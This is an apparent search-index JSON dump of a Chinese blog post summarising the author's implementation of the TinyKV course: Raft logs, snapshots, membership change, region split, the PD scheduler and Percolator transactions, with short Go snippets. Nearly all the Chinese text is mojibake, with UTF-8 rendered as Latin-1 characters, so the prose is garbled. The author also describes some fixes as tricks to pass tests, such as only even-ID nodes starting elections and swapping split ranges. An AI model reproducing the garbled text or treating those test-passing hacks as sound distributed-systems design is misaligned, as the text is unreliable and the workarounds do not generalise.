[{"categories":null,"content":"TinyKVæ˜¯æ•™å­¦é¡¹ç›®ï¼Œç®—æ˜¯PingCAP TiKVçš„goè¯­è¨€ç®€åŒ–ç‰ˆï¼Œå®ç°äº†ä¸€ä¸ªå¸¦æœ‰è°ƒåº¦å™¨çš„åŸºäºmulti-raftçš„åˆ†å¸ƒå¼K/Vå­˜å‚¨ã€‚ é¡¹ç›®æºåœ°å€ï¼šhttps://github.com/tidb-incubator/tinykv æˆ‘çš„å®ç°ï¼šhttps://github.com/waruto210/tinykv ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:0:0","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project1 StandaloneKV åŸºäºPingCAPä¿®æ”¹çš„badgerå®ç°ä¸€ä¸ªå•æœºçš„æ”¯æŒcolumn familyçš„K/Vå­˜å‚¨ã€‚è¿™ä¸ªéå¸¸ç®€å•ï¼Œå”¯ä¸€è®©æˆ‘è§‰å¾—ä¸èˆ’æœçš„å°±æ˜¯ï¼Œæ–‡æ¡£å’Œæ³¨é‡Šå¹¶æ²¡æœ‰æç¤ºåº”è¯¥æŸäº›æƒ…å†µæ˜¯å¦åº”è¯¥æŠ›å‡ºerrorï¼Œæ¯”å¦‚KeyNotFoundï¼Œè¦æŸ¥çœ‹æµ‹è¯•æ‰çŸ¥é“ã€‚ åŸºäºbadgerå®ç°StandAloneStorageï¼Œè¦æ±‚å®ç°å¦‚ä¸‹çš„Storageæ¥å£ï¼Œè¿™ä¸ªæ¥å£ä¹Ÿæ˜¯åé¢çœŸæ­£çš„åˆ†å¸ƒå¼RaftStorageè¦å®ç°çš„æ¥å£ã€‚å¦å¤–è¿˜æœ‰ä¸€ä¸ªMemStorageå®ç°äº†è¯¥æ¥å£ï¼Œç”¨äºæµ‹è¯•ã€‚ type Storage interface { Start() error Stop() error Write(ctx *kvrpcpb.Context, batch []Modify) error Reader(ctx *kvrpcpb.Context) (StorageReader, error) } type StorageReader interface { // When the key doesn't exist, return nil for the value GetCF(cf string, key []byte) ([]byte, error) IterCF(cf string) engine_util.DBIterator Close() } ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:1:0","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project2 RaftKV è¿™éƒ¨åˆ†è¦æ±‚å®ç°ä¸€ä¸ªå•ä¸ªregionçš„raft kvã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:0","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part A åœ¨æœ€å†…éƒ¨çš„Raftç»“æ„ä¸­ï¼Œä½¿ç”¨RaftLogæ¥ç®¡ç†æ—¥å¿—ã€‚å®ƒç»´æŠ¤ç€å„ç§indexï¼š snapshot/first.....applied....committed....stabled.....last æ‰€æœ‰æœªå‹ç¼©çš„log entrieséƒ½ä¼šè¢«æ”¾åœ¨å†…å­˜ä¸­çš„entriesæ•°ç»„ï¼ˆæ—¥å¿—å‹ç¼©åï¼Œåº”è¯¥æ›´æ–°ï¼‰ï¼Œä»firstå¼€å§‹ï¼›stableè¡¨ç¤ºå·²ç»è¢«æŒä¹…åŒ–åˆ°storageä¸­çš„æ—¥å¿—ï¼Œlastè¡¨ç¤ºå½“å‰æœ€æ–°æ—¥å¿—ã€‚ æ–°å»ºRaftæ—¶ï¼Œæ³¨æ„ä»config.storageå›å¤ä¹‹å‰çš„ä¿¡æ¯ï¼›é€‰ä¸¾æ—¶ï¼Œè¦æ³¨æ„å¤„ç†ä¸€äº›corner caseï¼Œä¾‹å¦‚åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ã€‚ å½“èŠ‚ç‚¹æˆä¸ºLeaderåï¼Œåº”è¯¥å…ˆAppendä¸€ä¸ªno-op entryï¼Œå¹¶å¹¿æ’­ç»™å…¶ä»–èŠ‚ç‚¹ï¼Œå› ä¸ºæ–°Leaderè™½ç„¶ä¸€å®šå…·æœ‰æœ€æ–°çš„æ—¥å¿—ï¼Œä½†commit indexä¸ä¸€å®šæ˜¯æœ€æ–°çš„ï¼Œè€Œä¸”Raftä¸å…è®¸Leaderç›´æ¥commitä¸å±äºè‡ªå·±ä»»æœŸçš„æ—¥å¿—ï¼Œè¿™æ ·å¯ä»¥å°½å¿«æ›´å¿«åœ°æ›´æ–°Leaderçš„commit indexåˆ°æœ€æ–°ã€‚åœ¨PingCAPçš„TiKV åŠŸèƒ½ä»‹ç» - Lease Readä¸­ä¹Ÿæåˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œetcdå’ŒTiKVåˆšå¼€å§‹éƒ½æ²¡æ³¨æ„åˆ°è¿™ä¸ªBugã€‚ ç„¶åè¦å®ç°RawNodeçš„ä¸¤ä¸ªå…³é”®æ–¹æ³•:HasReady()å’ŒAdvance()ã€‚å‰è€…è¿”å›ä¸€ä¸ªReadyç»“æ„ä½“ï¼Œè®°å½•äº†Raftå®ä¾‹çš„çŠ¶æ€ï¼Œéœ€è¦è¢«æŒä¹…åŒ–çš„æ—¥å¿—ï¼Œéœ€è¦è¢«applyçš„æ—¥å¿—ï¼Œéœ€è¦è¢«applyçš„snapshotï¼Œéœ€è¦å‘é€åˆ°å…¶ä»–Raftå®ä¾‹çš„æ¶ˆæ¯ï¼›åè€…åœ¨å‰è€…è¿”å›çš„Readyè¢«å¤„ç†åï¼Œéœ€è¦æ›´æ–°Raftå®ä¾‹çš„ç›¸å…³çŠ¶æ€ã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:1","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B è¿™ä¸€éƒ¨åˆ†æ˜¯é©±åŠ¨Raft KVçš„æ ¸å¿ƒã€‚ ä¸»è¦æ­¥éª¤ä¸ºï¼š å¯¹TinyKVçš„æ“ä½œè¢«å‘é€ç»™Raft Leaderæ‰€åœ¨èŠ‚ç‚¹ï¼› LeaderèŠ‚ç‚¹çš„peerMsgHandler.proposeRaftCommandè®°å½•proposalï¼Œå¹¶å°†æ“ä½œè½¬åŒ–ä¸ºRaft logï¼Œé©±åŠ¨Raftè¾¾æˆå…±è¯†ï¼› peerMsgHandler.HandleRaftReadyï¼šæ¯ä¸ªèŠ‚ç‚¹é€šè¿‡RawNodeè·å–Readyï¼Œå°†éœ€è¦è¢«æŒä¹…åŒ–çš„ä¿¡æ¯æŒä¹…åŒ–ï¼Œå°†éœ€è¦è¢«å‘é€çš„æ¶ˆæ¯å‘é€å‡ºå»ï¼Œç„¶åè°ƒç”¨Advanceï¼Œæ›´æ–°Raftå®ä¾‹çš„çŠ¶æ€ã€‚ LeaderèŠ‚ç‚¹è¿˜éœ€è¦å¤„ç†å½“åˆç•™ä¸‹çš„proposalï¼Œé€šè¿‡callbackå›å¤å®¢æˆ·ç«¯ã€‚ å¯¹äºè¯»æ“ä½œï¼Œå¯ä»¥ç›´æ¥å°†å…¶è½¬åŒ–ä¸ºä¸€ä¸ªLogï¼Œç­‰åˆ°HandleRaftReadyæ—¶å›å¤å®¢æˆ·ç«¯ï¼Œè¿™å»¶è¿Ÿä¼šå¾ˆé«˜ï¼›ä¹Ÿå¯ä»¥é‡‡ç”¨Raftè®ºæ–‡ section8çš„ä¼˜åŒ–æªæ–½ï¼ŒPingCAPçš„TiKV åŠŸèƒ½ä»‹ç» - Lease Readä¸­ä¹Ÿåšäº†è¯´æ˜ã€‚å¦å¤–ï¼Œapply logä¹Ÿå¯ä»¥å¼‚æ­¥æ‰§è¡Œï¼Œæå‡æ•ˆç‡ã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:2","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part C å‚ç…§PingCAPçš„TiKV æºç è§£æç³»åˆ—æ–‡ç« ï¼ˆåï¼‰Snapshot çš„å‘é€å’Œæ¥æ”¶ã€‚ åœ¨ Raft ä¸­ï¼ŒSnapshot æŒ‡çš„æ˜¯æ•´ä¸ª State Machine æ•°æ®çš„ä¸€ä»½å¿«ç…§ï¼Œå¤§ä½“ä¸Šæœ‰ä»¥ä¸‹è¿™å‡ ç§æƒ…å†µéœ€è¦ç”¨åˆ° Snapshotï¼š æ­£å¸¸æƒ…å†µä¸‹ leader ä¸ follower ä¹‹é—´æ˜¯é€šè¿‡ append log çš„æ–¹å¼è¿›è¡ŒåŒæ­¥çš„ï¼Œå‡ºäºç©ºé—´å’Œæ•ˆç‡çš„è€ƒè™‘ï¼Œleader ä¼šå®šæœŸæ¸…ç†è¿‡è€çš„ logã€‚å‡å¦‚ follower/learner å‡ºç°å®•æœºæˆ–è€…ç½‘ç»œéš”ç¦»ï¼Œæ¢å¤ä»¥åå¯èƒ½æ‰€ç¼ºçš„ log å·²ç»åœ¨ leader èŠ‚ç‚¹è¢«æ¸…ç†æ‰äº†ï¼Œæ­¤æ—¶åªèƒ½é€šè¿‡ Snapshot çš„æ–¹å¼è¿›è¡ŒåŒæ­¥ã€‚ Raft åŠ å…¥æ–°çš„èŠ‚ç‚¹çš„ï¼Œç”±äºæ–°èŠ‚ç‚¹æ²¡åŒæ­¥è¿‡ä»»ä½•æ—¥å¿—ï¼Œåªèƒ½é€šè¿‡æ¥æ”¶ Snapshot çš„æ–¹å¼æ¥åŒæ­¥ã€‚å®é™…ä¸Šè¿™ä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯ 1 çš„ä¸€ç§ç‰¹æ®Šæƒ…å½¢ã€‚ å‡ºäºå¤‡ä»½/æ¢å¤ç­‰éœ€æ±‚ï¼Œåº”ç”¨å±‚éœ€è¦ dump ä¸€ä»½ State Machine çš„å®Œæ•´æ•°æ®ã€‚ å®é™…ä¸Šä¸»è¦æ˜¯æƒ…å†µ1å’Œ2ã€‚ Snapshotä¸æ˜¯ä½œä¸ºæ™®é€šçš„RaftMessageå‘é€çš„ï¼Œå› ä¸ºå…¶Sizeå¤ªå¤§ã€‚ Raftstore æƒ³è¦gcæ—¶ï¼Œproposeä¸€ä¸ªAdminCmdType_CompactLogï¼Œç­‰åˆ°commitåï¼Œå¤„ç†readyæ—¶ï¼Œä¿®æ”¹RaftTruncatedStateï¼Œç„¶åè¿›è¡Œå®é™…çš„gcåˆ é™¤æ—¥å¿—ã€‚åç»­Raft Leaderå‘followerå‘é€æ—¥å¿—æ—¶ï¼Œå¦‚æœæ‰¾ä¸åˆ°nextæŒ‡é’ˆå¯¹åº”çš„logï¼Œé‚£ä¹ˆè¯¥logç”±äºcompactionå·²ç»è¢«ä¸¢å¼ƒäº†ï¼Œæ‰€ä»¥åªèƒ½å‘é€snapshotã€‚Leaderè°ƒç”¨Storage.Snapshot()ç”Ÿæˆsnapshotï¼Œå°±ç»ªåï¼ŒLeaderå‘å‡ºsnapshot messageï¼Œfollower æ”¶åˆ°snapshot messageåï¼Œfollowerè°ƒç”¨handleSnapshotå¤„ç†ï¼Œåœ¨RaftLogä¸­è®°å½•pendingSnapshotï¼Œç­‰handleRaftReadyæ—¶ï¼Œæ ¹æ®snapshot messageçš„å†…ä¿¡æ¯ï¼Œæ–°å»ºtaskå»apply snapshotã€‚snapshotå…·ä½“çš„ä¼ è¾“åŠapplyç»†èŠ‚TinyKVæ¡†æ¶å·²ç»å®ç°å¥½äº†ï¼Œè¦äº†è§£çš„è¯ï¼Œå¯ä»¥æŸ¥çœ‹ğŸ‘†çš„æ–‡ç« ã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:3","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project3 MultiRaftKV è¿™ä¸€ç‚¹ï¼Œè¦å®ç°å¤šregionå¤šRaft Groupçš„æœºåˆ¶ã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:0","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part A å®ç°3Açš„leader transferå’Œconf changeéå¸¸ç®€å•ï¼Œæˆ‘è§‰å¾—è¿™é‡Œå®‰æ’ä¸åˆç†ï¼ŒæŠŠå¤ªå¤šå†…å®¹å®‰æ’åˆ°3Bäº†ï¼Œ3Açš„æµ‹è¯•ä¹Ÿä¸è¶³ï¼Œå¯¼è‡´å¾ˆå¤šå‘åœ¨3Bæ‰è¢«å‘ç°ã€‚ Raftå®ä¾‹ä½¿ç”¨PendingConfIndexæ¥è®°å½•æœ€æ–°çš„conf change entryçš„indexï¼Œå¦‚æœæœ‰æ›´æ–°çš„conf change entryï¼Œåº”è¯¥ä¿®æ”¹ä¸ºæœ€æ–°çš„ï¼Œå› ä¸ºå¯èƒ½æœ‰Leader proposeæ–°çš„conf changeä¹‹åï¼Œæ²¡æœ‰æ¥å¾—åŠå¤åˆ¶åˆ°å¤§å¤šæ•°èŠ‚ç‚¹ï¼ŒLeaderå´©æºƒï¼Œé‡æ–°é€‰ä¸¾çš„Leaderæ²¡æœ‰è¯¥æ—¥å¿—ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¯èƒ½ä¼šproposeæ–°çš„conf changeã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:1","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B leader transferå’Œconf change è¿™éƒ¨åˆ†è¦å®ç°å¯¹AdminCmdType_TransferLeaderå’ŒAdminCmdType_ChangePeerçš„å¤„ç†ã€‚ å½“Raft.leadTransfereeä¸ä¸ºNoneæ—¶ï¼Œä¸ºäº†ä½¿leader transferå°½å¿«æˆåŠŸï¼Œåº”è¯¥æ‹’ç»proposeæ–°çš„commandã€‚ å¯¹äºconf changeï¼Œæœ‰ä¸€äº›å‘ã€‚ é¦–å…ˆï¼Œæ–°å»ºpeerçš„Raftå®ä¾‹ï¼Œå…¶Raft.Prsæ˜¯ç©ºçš„ï¼Œè¦ç­‰åˆ°apply snapshotåï¼Œæ‰èƒ½è·å–åˆ°å½“å‰Groupçš„peersä¿¡æ¯ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œr.Prs[r.id]ä¸å­˜åœ¨ï¼Œè€Œå¦ä¸€ç§æƒ…å†µï¼Œrç”±äºconf changeè¢«åˆ é™¤ï¼Œr.Prs[r.id]ä¹Ÿä¸å­˜åœ¨ï¼Œå¦‚æœç›´æ¥è¿”å›ï¼Œä¾é åˆ¤æ–­r.Prs[r.id]æ¥å†³å®šæ˜¯å¦è¦å¤„ç†messageï¼Œæ˜¯ä¸è¡Œçš„ã€‚æ‰€ä»¥ï¼Œä½œå¦‚ä¸‹çš„åˆ¤æ–­ï¼Œè®©æ–°peerèƒ½å¤Ÿæ­£å¸¸æ¥æ”¶messageã€‚ func (r *Raft) Step(m pb.Message) error { // Your Code Here (2A). // if r have been removed due to conf change // or new added node has no Prs but should step if _, ok := r.Prs[r.Id]; !ok \u0026\u0026 len(r.Prs) != 0 { log.Infof(\"%d do not exist and have other peers return, term %d, Prs %+v\\n\", r.Id, r.Term, r.Prs) return nil } switch r.State { case StateFollower: r.stepFollower(m) case StateCandidate: r.stepCandidate(m) case StateLeader: r.stepLeader(m) } return nil } æ­¤å¤–ï¼Œè€ƒè™‘åˆ°æ–°èŠ‚ç‚¹æ²¡æœ‰æ•°æ®ï¼Œä¸ºäº†é¿å…ä¸å¿…è¦çš„è¶…æ—¶é€‰ä¸¾ï¼ˆè€Œä¸”ç”±äºPrsä¸ºç©ºï¼Œæ‰€ä»¥é€‰ä¸¾ä¼šç›´æ¥æˆåŠŸï¼Œé€ æˆè„‘è£‚ï¼‰ï¼Œå½“èŠ‚ç‚¹çš„termä¸º0æ—¶ï¼Œä¸è¿›è¡Œtickï¼›æ”¶åˆ°Leaderçš„å¿ƒè·³åï¼Œç«‹å³å°†è‡ªå·±å’ŒLeaderåŠ å…¥åˆ°r.Prsä¸­ã€‚ è§£å†³å®Œä»¥ä¸Šé—®é¢˜åï¼Œè·‘æµ‹è¯•å‡ºç°è¶…æ—¶çš„æ¦‚ç‡è¿˜æ˜¯æ¯”è¾ƒå¤§ï¼Œé€šè¿‡æ‰“logå‘ç°ä»¥ä¸‹é—®é¢˜ï¼šæ‰§è¡Œå®ŒRaft.addNodeåï¼ŒLeaderå‘æ–°peerå‘é€snapshotï¼Œä½†æ˜¯æœ‰æ—¶ä¼šå‡ºç°Leaderå…ˆå‘é€å®Œsnapshotåï¼Œæ–°çš„peeræ‰åˆ›å»ºå®Œæˆï¼Œå¼€å§‹æ¥å—æ¶ˆæ¯ï¼Œå¯¼è‡´è¿™ä¸ªsnapshotå°±æ¶ˆå¤±äº†ã€‚åœ¨æˆ‘çš„å®ç°ä¸­ï¼ŒLeaderå‘é€snapshotåï¼Œç›´æ¥è®¾ç½®è‡ªå·±çš„r.Prs[to].Next = snapshot.Metadata.Index + 1ï¼Œå› ä¸ºä¸è¿™æ ·åšï¼Œå¾ˆå¯èƒ½åœ¨æ–°peerçš„responseå›æ¥ä¹‹å‰ï¼Œåˆå› ä¸ºè§¦å‘sendAppendå‘å…¶å‘é€snapshotï¼Œè€Œç”Ÿæˆsnapshotæ˜¯æå…¶è´¹æ—¶çš„ï¼›ä½†æ˜¯åœ¨å‰é¢çš„é—®é¢˜ä¸‹ï¼Œç”±äºsnapshotä¸¢äº†ï¼Œé‚£ä¹ˆLeaderå‘é€åç»­æ—¥å¿—æ—¶ï¼Œæ–°peerä¼šæ‹’ç»ï¼ŒLeaderå°†Next -= 1ï¼Œç„¶åç»§ç»­ï¼Œç›´åˆ°Nextå°äºLeaderæ—¥å¿—çš„first indexï¼Œå¦‚æ­¤æ¥å›ï¼Œè€—è´¹äº†å¤§é‡æ—¶é—´ï¼Œè‡ªç„¶å°±è¶…æ—¶äº†ã€‚æ‰€ä»¥ï¼Œæœ€ååœ¨æˆ‘çš„å®ç°ä¸­ï¼Œfollowerä¼šå°†response messageçš„m.Indexè®¾ç½®ä¸ºè‡ªå·±çš„last indexï¼Œleaderå‘ç°å…¶å°äºè‡ªå·±çš„first indexçš„è¯ï¼Œå°±ç«‹å³å‘é€snapshotï¼Œè§£å†³snapshotä¸¢å¤±çš„é—®é¢˜ã€‚ æ­¤å¤–ï¼Œconf changeæœ‰ä¸€ä¸ªç‰¹æ®Šcaseã€‚è€ƒè™‘ï¼šå½“å‰Raft groupæœ‰ä¸¤ä¸ªèŠ‚ç‚¹Leader Aã€Follower Bï¼Œconf changeè¦remove Aï¼Œé‚£ä¹ˆä¼šå‡ºç°ä»¥ä¸‹é—®é¢˜ï¼ŒAæŠŠconf changeçš„logæˆåŠŸå¤åˆ¶ç»™Bä¹‹åï¼ŒA apply conf changeï¼ŒæŠŠè‡ªå·±åˆ é™¤ï¼Œæ²¡æ¥å¾—åŠæŠŠæ–°çš„commit indexå‘é€ç»™Bï¼›æ­¤æ—¶Bçš„commit indexä¸å¤Ÿæ–°ï¼Œæ— æ³•applyè¿™æ¡con changeï¼Œç„¶åBè¶…æ—¶ï¼Œå¼€å¯é€‰ä¸¾ï¼Œæ­¤æ—¶Bçš„Prsä¸­è¿˜æœ‰Aï¼ŒBæ°¸è¿œæ— æ³•é€‰ä¸¾æˆåŠŸã€‚è¿™ç§é—®é¢˜æœ‰ä¸€ä¸ªè§£å†³åŠæ³•ï¼Œå°±æ˜¯removeè‡ªå·±æ—¶ï¼Œè®¡ç®—quorumä¸è¦æŠŠè‡ªå·±ç®—è¿›å»ã€‚ä½†æ˜¯TinyKVçš„æ¡†æ¶ä¸æ–¹ä¾¿å®ç°è¿™ä¸ªï¼Œåº•å±‚Raftå¹¶ä¸çŸ¥é“æ˜¯removeè¿˜æ˜¯addï¼Œæ›´ä¸çŸ¥é“removeè°ï¼Œè¦å®ç°çš„è¯ï¼Œéœ€è¦æ›´æ”¹ä¸€äº›ä»£ç ã€‚æ‰€ä»¥æˆ‘é€‰æ‹©ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç›´æ¥returnï¼Œä¸äºˆæ¥å—ã€‚ if req.ChangePeer.ChangeType == eraftpb.ConfChangeType_RemoveNode \u0026\u0026 d.IsLeader() \u0026\u0026 len(d.Region().Peers) == 2 \u0026\u0026 req.ChangePeer.Peer.Id == d.PeerId() { //log.Infof(\"%s return corner case\\n\", d.Tag) err := fmt.Sprintf(\"%s return corner case\\n\", d.Tag) cb.Done(ErrResp(errors.New(err))) return } split region in raftstore è¿™é‡Œè¦å®ç°regionåˆ†è£‚ï¼Œå®ç°äº†è¿™ä¸ªï¼Œå°±çœŸçš„å®ç°äº†multi-raft K/V storeäº†ã€‚æµç¨‹æ¯”è¾ƒç®€å•ï¼ŒæŒ‰ç…§æ–‡æ¡£ç»™å‡ºçš„æµç¨‹å°±å¥½äº†ã€‚ ä¸è¿‡åœ¨æµ‹è¯•ä¸­é‡åˆ°äº†no regioné—®é¢˜ï¼Œåœ¨asktugä¸Šï¼Œå‘ç°è¿™ä¸ªé—®é¢˜æŒºæ™®éçš„ã€‚è¿™æ˜¯å› ä¸ºï¼šå‘PDè¯·æ±‚regionä¿¡æ¯æ—¶ï¼Œæ‰¾ä¸åˆ°å¯¹åº”çš„regionä¿¡æ¯ã€‚ regionåˆ†è£‚ä¸€èˆ¬çš„å®ç°æ˜¯ [A, B) -\u003e [A, C) + [C, B)ï¼Œç°æœ‰regionåˆ†é…ä¸º[A, C)ï¼Œæ–°regionåˆ†é…ä¸º[C, B)ã€‚æ—§regionæ˜¯æ­£å¸¸çš„ï¼ŒLeaderåœ¨æŒç»­ç»™PDå‘é€å¿ƒè·³ï¼ŒPDèƒ½å¤ŸåŠæ—¶æ›´æ–°regionä¿¡æ¯ï¼Œè€Œæ–°regionè¿˜éœ€è¦ç­‰å¾…å¤šä¸ªpeeråˆ›å»ºå®Œæˆï¼Œè¶…æ—¶ï¼Œç„¶åé€‰å‡ºLeaderï¼Œå‘é€å¿ƒè·³ç»™PDã€‚å› ä¸ºï¼Œå‘PDæŸ¥æ–°regionä¿¡æ¯æ—¶ï¼Œæœ‰ä¸€æ®µæ—¶é—´æŸ¥ä¸åˆ°[C, B)çš„ä¿¡æ¯ã€‚ æˆ‘çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šé¦–å…ˆï¼Œå¯¹äºTermä¸º5çš„èŠ‚ç‚¹ï¼ˆregionåˆ†è£‚ï¼Œæ–°å»ºçš„æ­£å¸¸èŠ‚ç‚¹Termæ˜¯5ï¼‰ï¼Œç«‹å³å¼€å§‹é€‰ä¸¾ï¼Œä¸ºäº†é˜²æ­¢å¤šä¸ªèŠ‚ç‚¹åŒæ—¶å¼€å§‹é€‰ä¸¾ï¼Œå¯¼è‡´å¤šæ¬¡é€‰ä¸¾å¤±è´¥ï¼Œå¯ä»¥ä»…è®©Idä¸ºå¶æ•°çš„èŠ‚ç‚¹å¼€å§‹é€‰ä¸¾ï¼›æ­¤å¤–ï¼Œç”±äºæµ‹è¯•ä¸­ï¼Œè¯·æ±‚çš„keyåœ¨å¢å¤§ï¼Œæ‰€ä»¥ä¸ºäº†å¯ä»¥è®©æ—§regionè´Ÿè´£[C, B)ï¼Œæ–°regionè´Ÿè´£[A, C)ï¼Œè¿™æ ·èƒ½å¤Ÿsplitå®Œæˆåï¼Œèƒ½å¤Ÿç«‹å³å“åº”æ–°çš„è¯·æ±‚ï¼Œä¸è¿‡è¿™ç§æ”¹è¿›æ„Ÿè§‰åªç®—æ˜¯ä¸ºäº†é€šè¿‡æµ‹è¯•çš„trickyã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:2","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part C è¿™éƒ¨åˆ†æ˜¯å®ç°ä¸€ä¸ªå°å‹çš„PDï¼Œå®ç°æ”¶é›†å¿ƒè·³ä¸é›†ç¾¤å¹³è¡¡ï¼Œæ¯”è¾ƒç®€å•ï¼ŒæŒ‰ç…§æ–‡æ¡£å®ç°å³å¯ã€‚ ä¸è¿‡ï¼Œæ–‡æ¡£ä¸­å°‘äº†ä¸€ä¸ªé™åˆ¶æ¡ä»¶ï¼Œåœ¨æµ‹è¯•ä¸­ä½“ç°äº†ï¼Œè¢«è¿ç§»çš„regionï¼Œå…¶åˆ†å¸ƒçš„storeæ•°é‡è¦æ»¡è¶³é›†ç¾¤çš„MaxReplicasã€‚è¿™åº”è¯¥æ˜¯ä¸ºäº†é˜²æ­¢è¿ç§»regionå¯¼è‡´é›†ç¾¤ä¸å¯ç”¨ï¼Œåšçš„ä¼˜åŒ–ã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:3","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project 4: Transactions TinyKVé‡‡ç”¨çš„Percolatorç®—æ³•ï¼Œæä¾›äº†snapshotéš”ç¦»æ€§ï¼Œå®¢æˆ·ç«¯ä»æ•°æ®åº“è¯»åˆ°çš„æ•°æ®å°±åƒä»å®ƒå¼€å§‹æ‰§è¡Œäº‹åŠ¡æ—¶æ•°æ®åº“è¢«frozenäº†ä¸€æ ·ï¼ˆå®¢æˆ·ç«¯è§‚å¯Ÿåˆ°æ•°æ®åº“ä¸€ä¸ªä¸€è‡´çš„viewï¼‰ã€‚ Percolatorç®—æ³•æºè‡ªLarge-scale Incremental Processing Using Distributed Transactions and Notificationsï¼Œå¯ä»¥å‚è€ƒPingCAPè¿™ç¯‡æ–‡ç« Deep Dive TiKV - Percolatorã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:0","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part A è¿™éƒ¨åˆ†å°±æ˜¯å®ç°å¯¹MVCCåŸºç¡€ç»“æ„çš„å°è£…ï¼Œæ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯ä»£ç å¯èƒ½å†™èµ·æ¥æœ‰ç‚¹çƒ¦ã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:1","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B è¿™éƒ¨åˆ†å®ç°Percolatoräº‹åŠ¡æœ€å…³é”®çš„ä¸‰ä¸ªæ“ä½œï¼Œè¯»ï¼ŒPewwriteï¼Œå’Œcommitã€‚ KvGetï¼š æ—¶é—´æˆ³ts æŸ¥æ‰¾æ˜¯å¦æœ‰[0, ts]çš„é”ï¼Œå¦‚æœæœ‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸èƒ½ç¡®å®šè¯¥äº‹åŠ¡æ˜¯å¦åœ¨tså‰è¢«commitï¼ˆå·²ç»commitï¼Œé”è¿˜æ²¡é‡Šæ”¾å®Œï¼‰ï¼Œè¿”å›ï¼Œç¨åé‡è¯•ï¼›å¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥è¯» ä»write CFè¯»å–[0, ts]èŒƒå›´å†…æœ€æ–°çš„writeè®°å½•ï¼Œä»ä¸­è·å–å¯¹åº”äº‹åŠ¡çš„start_ts æ ¹æ®start_tsç„¶åè¯»å–default CF KvPrewrite æ—¶é—´æˆ³start_ts å¯¹æ¯ä¸ªkeyï¼ŒåŠ ä¸€ä¸ªlockï¼Œç„¶åä»¥start_tsæŠŠæ•°æ®å†™å…¥default CFï¼Œé€‰æ‹©ä¸€ä¸ªlockä¸ºprimary lockï¼Œæ¯ä¸ªlockéƒ½åŒ…æ‹¬start_tsï¼›å¦‚æœkeyä¸Šå·²ç»æœ‰lockï¼Œå›æ»šäº‹åŠ¡ Kv Commit æ—¶é—´æˆ³commit_ts ç§»é™¤primary lockï¼ŒåŒæ—¶åœ¨write CFå†™å…¥ä¸€ä¸ªå¸¦æœ‰start_tsçš„è®°å½•ï¼›å¦‚æœprimary lockæ²¡æœ‰äº†ï¼ˆè¶…æ—¶ï¼Œè¢«å…¶ä»–äº‹åŠ¡ç§»é™¤äº†ï¼‰ï¼Œäº‹åŠ¡å¤±è´¥ ç§»é™¤æ‰€æœ‰secondary lock åªè¦primary lockè¢«ç§»é™¤ï¼Œäº‹åŠ¡å°±ç®—æˆåŠŸã€‚ æœ‰ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„åœ°æ–¹ï¼ŒåŸPercolatorç³»ç»ŸåŸºäºBigTableï¼Œå®ƒæ˜¯æ”¯æŒå•è¡Œäº‹åŠ¡çš„ï¼Œlockï¼Œwriteï¼Œdataåªä¸è¿‡æ˜¯å•è¡Œçš„ä¸€ä¸ªåˆ—ï¼›è€ŒTinyKVè¿™é‡Œï¼Œæ˜¯3ä¸ªCFï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥åŸå­æ€§çš„å†™å…¥3ä¸ªCFï¼Œä½†æ˜¯è€ƒè™‘ï¼šå¦‚æœä¸¤ä¸ªäº‹åŠ¡åŒæ—¶æ£€æŸ¥Keyæ˜¯å¦åŠ é”ï¼Œç„¶åå‘ç°æ²¡æœ‰é”ï¼Œåœ¨åŒæ—¶å†™å…¥é”ï¼Œè¿™ä¸­é—´å¹¶ä¸ä¼šæœ‰ä»»ä½•é˜»ç¢ã€‚æ‰€ä»¥ï¼Œæ¡†æ¶æä¾›äº†Latchï¼Œæ³¨é‡Šå†™é“: Only one thread can hold a latch at a time and all keys that a command might write must be locked // at once. 